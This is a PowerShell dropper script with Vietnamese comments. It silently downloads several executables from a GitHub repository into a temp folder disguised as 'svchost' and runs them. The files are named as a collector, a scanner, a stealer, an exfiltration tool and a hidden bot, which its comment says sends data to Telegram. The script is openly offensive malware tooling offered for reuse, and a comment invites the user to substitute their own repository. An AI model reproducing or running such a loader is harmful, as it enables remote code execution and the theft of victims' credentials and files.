# run.ps1 - Tự động tải và chạy 7 file
$ErrorActionPreference = "SilentlyContinue"

# Tạo thư mục tạm
$tempDir = "$env:TEMP\svchost"
New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
Set-Location $tempDir

# 🔥 THAY ĐỔI DÒNG NÀY - USERNAME/REPO CỦA BẠN
$baseUrl = "https://raw.githubusercontent.com/hp044-dtt/zz/main/"

# Danh sách 7 file cần tải
$files = @(
    "main.py",
    "scanner.exe", 
    "stealer.exe",
    "exfil.exe",
    "bot.exe",
    "loader.exe",
    "config.json"
)

# Tải từng file
Write-Host "[*] Downloading files..." -ForegroundColor Yellow
foreach ($file in $files) {
    $url = $baseUrl + $file
    $output = "$tempDir\$file"
    try {
        Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
        Write-Host "[+] Downloaded: $file" -ForegroundColor Green
    } catch {
        Write-Host "[-] Failed: $file" -ForegroundColor Red
    }
}

# Chạy Python collector
if (Test-Path "$tempDir\main.py") {
    Write-Host "[*] Running Python collector..." -ForegroundColor Yellow
    try {
        Start-Process -FilePath "python" -ArgumentList "$tempDir\main.py" -Wait -NoNewWindow
        Write-Host "[+] Python done!" -ForegroundColor Green
    } catch {
        Write-Host "[-] Python failed (Python installed?)" -ForegroundColor Red
    }
}

# Chạy C++ scanner
if (Test-Path "$tempDir\scanner.exe") {
    Write-Host "[*] Running C++ scanner..." -ForegroundColor Yellow
    Start-Process -FilePath "$tempDir\scanner.exe" -Wait -NoNewWindow
    Write-Host "[+] C++ done!" -ForegroundColor Green
}

# Chạy Rust stealer
if (Test-Path "$tempDir\stealer.exe") {
    Write-Host "[*] Running Rust stealer..." -ForegroundColor Yellow
    Start-Process -FilePath "$tempDir\stealer.exe" -Wait -NoNewWindow
    Write-Host "[+] Rust done!" -ForegroundColor Green
}

# Chạy Nim exfil
if (Test-Path "$tempDir\exfil.exe") {
    Write-Host "[*] Running Nim exfil..." -ForegroundColor Yellow
    Start-Process -FilePath "$tempDir\exfil.exe" -Wait -NoNewWindow
    Write-Host "[+] Nim done!" -ForegroundColor Green
}

# Chạy Go bot (gửi dữ liệu về Telegram)
if (Test-Path "$tempDir\bot.exe") {
    Write-Host "[*] Running Go bot..." -ForegroundColor Yellow
    Start-Process -FilePath "$tempDir\bot.exe" -WindowStyle Hidden
    Write-Host "[+] Go bot started!" -ForegroundColor Green
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   ALL MODULES EXECUTED SUCCESSFULLY!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
